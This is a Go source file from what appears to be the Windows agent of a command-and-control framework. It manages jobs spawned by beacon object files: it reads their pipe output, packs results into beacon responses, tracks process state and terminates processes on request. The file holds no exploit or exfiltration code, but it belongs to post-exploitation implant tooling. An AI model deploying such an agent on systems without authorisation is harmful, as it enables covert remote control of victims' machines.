//go:build windows
// +build windows

package main

import (
	"fmt"
	"gopher/utils"
	"os"
	"sync"
	"syscall"
	"unsafe"

	"github.com/vmihailenco/msgpack/v5"
)

// ProcessJobs holds all active process jobs that need pipe polling
var ProcessJobs []utils.ProcessJobData
var ProcessJobsMutex sync.Mutex

// registerProcessJob adds a job to the polling list
// Called by registerJob (the callback from BOF)
func registerProcessJob(taskId uint32, hProcess uintptr, pid uint16, hPipeRead uintptr, hPipeWrite uintptr) bool {

	// Close the write end of the pipe in this process
	if hPipeWrite != 0 {

		pipeWrite := os.NewFile(hPipeWrite, "pipe_write")
		if pipeWrite != nil {
			pipeWrite.Close()
		}
	}

	jobData := utils.ProcessJobData{
		TaskId:   taskId,
		JobType:  utils.JOB_TYPE_PROCESS,
		JobState: utils.JOB_STATE_RUNNING,
		HProcess: hProcess,
		Pid:      pid,
		PipeRead: hPipeRead,
	}

	ProcessJobsMutex.Lock()
	ProcessJobs = append(ProcessJobs, jobData)
	ProcessJobsMutex.Unlock()

	// Also add to JOBS map so it shows in job list (with a dummy connection)
	taskStr := fmt.Sprintf("%x", taskId)
	connection := utils.Connection{
		PackType: utils.JOB_TYPE_PROCESS,
	}
	JobsMutex.Lock()
	JOBS[taskStr] = connection
	JobsMutex.Unlock()

	return true
}

// IsProcessJobRunning checks if a job is currently running for the given task ID
func IsProcessJobRunning(taskId uint32) bool {
	ProcessJobsMutex.Lock()
	defer ProcessJobsMutex.Unlock()

	for _, job := range ProcessJobs {
		if job.TaskId == taskId && job.JobState == utils.JOB_STATE_RUNNING {
			return true
		}
	}
	return false
}

// PollProcessJobs reads output from all active process jobs
// Returns command results to be included in the beacon response
func PollProcessJobs() [][]byte {
	var results [][]byte

	ProcessJobsMutex.Lock()
	defer ProcessJobsMutex.Unlock()

	// Iterate through jobs
	for i := 0; i < len(ProcessJobs); i++ {
		job := &ProcessJobs[i]

		// Read available data from pipe
		data := readFromPipe(job.PipeRead)
		if len(data) > 0 {

			// Create BOF output message for streaming
			// Type 32 = CALLBACK_OUTPUT_UTF8 (0x20) - compatible with C++ implementation
			bofOut := utils.AnsExecBofOut{
				Type: utils.CALLBACK_OUTPUT_UTF8,
				Data: data,
			}
			bofOutBytes, _ := msgpack.Marshal(bofOut)

			// Create command result using COMMAND_EXEC_BOF_OUT (51)
			result := utils.Command{
				Id:   uint(job.TaskId),
				Code: utils.COMMAND_EXEC_BOF_OUT,
				Data: bofOutBytes,
			}
			resultBytes, _ := msgpack.Marshal(result)
			results = append(results, resultBytes)
		}

		// Check if process is still running
		if job.JobState == utils.JOB_STATE_RUNNING {
			if !isProcessRunning(job.HProcess) {

				job.JobState = utils.JOB_STATE_FINISHED
			}
		}

		if job.JobState == utils.JOB_STATE_KILLED || job.JobState == utils.JOB_STATE_FINISHED {

			// Send Job Finished notification to close the task on server
			bofOut := utils.AnsExecBofOut{
				Type: utils.CALLBACK_JOB_FINISHED,
				Data: []byte{},
			}
			bofOutBytes, _ := msgpack.Marshal(bofOut)

			// Create command result using COMMAND_EXEC_BOF_OUT (51)
			result := utils.Command{
				Id:   uint(job.TaskId),
				Code: utils.COMMAND_EXEC_BOF_OUT,
				Data: bofOutBytes,
			}
			resultBytes, _ := msgpack.Marshal(result)
			results = append(results, resultBytes)

			// Close pipe
			if job.PipeRead != 0 {
				pipeRead := os.NewFile(job.PipeRead, "pipe_read")
				if pipeRead != nil {
					pipeRead.Close()
				}
			}

			// Remove from JOBS map
			taskStr := fmt.Sprintf("%x", job.TaskId)
			JobsMutex.Lock()
			delete(JOBS, taskStr)
			JobsMutex.Unlock()

			// Remove from slice
			ProcessJobs = append(ProcessJobs[:i], ProcessJobs[i+1:]...)
			i--
		}
	}

	return results
}

// readFromPipe reads available data from a Windows pipe handle
func readFromPipe(hPipe uintptr) []byte {
	if hPipe == 0 {
		return nil
	}

	// PeekNamedPipe to check if data is available
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	peekNamedPipe := kernel32.NewProc("PeekNamedPipe")
	readFile := kernel32.NewProc("ReadFile")

	var available uint32
	ret, _, _ := peekNamedPipe.Call(
		hPipe,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&available)),
		0,
	)

	if ret == 0 || available == 0 {
		return nil
	}

	// Read available data
	buf := make([]byte, available)
	var bytesRead uint32
	ret, _, _ = readFile.Call(
		hPipe,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(available),
		uintptr(unsafe.Pointer(&bytesRead)),
		0,
	)

	if ret == 0 || bytesRead == 0 {
		return nil
	}

	return buf[:bytesRead]
}

// isProcessRunning checks if a process handle is still active
func isProcessRunning(hProcess uintptr) bool {
	if hProcess == 0 {
		return false
	}

	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getExitCodeProcess := kernel32.NewProc("GetExitCodeProcess")

	var exitCode uint32
	ret, _, _ := getExitCodeProcess.Call(
		hProcess,
		uintptr(unsafe.Pointer(&exitCode)),
	)

	if ret == 0 {
		return false
	}

	const STILL_ACTIVE = 259
	return exitCode == STILL_ACTIVE
}

// killProcessJob finds and kills a job by task ID
func killProcessJob(taskId string) bool {
	ProcessJobsMutex.Lock()
	defer ProcessJobsMutex.Unlock()

	for i := range ProcessJobs {
		if fmt.Sprintf("%x", ProcessJobs[i].TaskId) == taskId {

			// Terminate process
			kernel32 := syscall.NewLazyDLL("kernel32.dll")
			terminateProcess := kernel32.NewProc("TerminateProcess")
			terminateProcess.Call(ProcessJobs[i].HProcess, 0)

			ProcessJobs[i].JobState = utils.JOB_STATE_KILLED
			return true
		}
	}
	return false
}
